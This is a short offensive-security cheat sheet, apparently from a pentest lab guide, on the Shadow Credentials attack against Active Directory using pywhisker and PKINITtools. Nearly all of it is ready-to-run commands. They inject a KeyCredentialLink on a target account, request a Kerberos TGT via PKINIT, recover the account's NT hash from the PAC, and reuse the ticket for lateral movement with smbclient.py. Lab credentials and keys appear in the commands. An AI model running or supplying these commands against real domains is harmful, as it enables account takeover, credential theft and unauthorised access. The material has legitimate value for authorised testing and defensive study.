# 11.05 Shadow Credentials pywhisker

> From Linux, `pywhisker` injects KeyCredentialLink, `gettgtpkinit.py` gets a TGT, `getnthash.py` decrypts the PAC for the NT hash.

## Overview

pywhisker is the Linux/Python equivalent of Whisker, using Impacket and PyDSInternals. After injecting a Key Credential, PKINITtools' gettgtpkinit.py requests a TGT via PKINIT and outputs the AS-REP encryption key. getnthash.py then decrypts the PAC using that key and a U2U TGS to recover the NT hash. The TGT ccache can also be used directly for lateral movement.

## Steps

- Clone pywhisker and run with --action add to inject a certificate; note the PFX filename and password.
- Install PKINITtools (gettgtpkinit.py, getnthash.py) via pip3 install impacket minikerberos.
- Run gettgtpkinit.py with -cert-pfx and -pfx-pass to get a TGT (.ccache) and the AS-REP encryption key.
- Run getnthash.py with KRB5CCNAME pointing to the ccache and -key set to the AS-REP key to recover the NT hash.
- Use the ccache directly with KRB5CCNAME= prefix for tools like smbclient.py.
- Enumerate rights from Linux with dacledit.py to confirm GenericAll or WriteProperty on msDS-KeyCredentialLink.

## Commands

### Clone pywhisker

```bash
git clone -q https://github.com/ShutdownRepo/pywhisker
```

### Inject shadow credential

```bash
python3 pywhisker.py -d lab.local -u jeffry -p Music001 --target gabriel --action add
```

### Install PKINITtools dependencies

```bash
git clone -q https://github.com/dirkjanm/PKINITtools && pip3 install impacket minikerberos
```

### Request TGT via PKINIT

```bash
python3 gettgtpkinit.py -cert-pfx ../pywhisker/BX4EWk8m.pfx -pfx-pass KQAx5lHP3h9TtzNly2Us lab.local/gabriel gabriel.ccache
```

### Recover NT hash from TGT PAC

```bash
KRB5CCNAME=gabriel.ccache python3 getnthash.py -key 46c30d948cbe2ab0749d2f72896692c18673e9a4fae6438bff32a33afb49245a lab.local/gabriel
```

### Use TGT for lateral movement

```bash
KRB5CCNAME=gabriel.ccache smbclient.py -k -no-pass LAB-DC.LAB.LOCAL
```
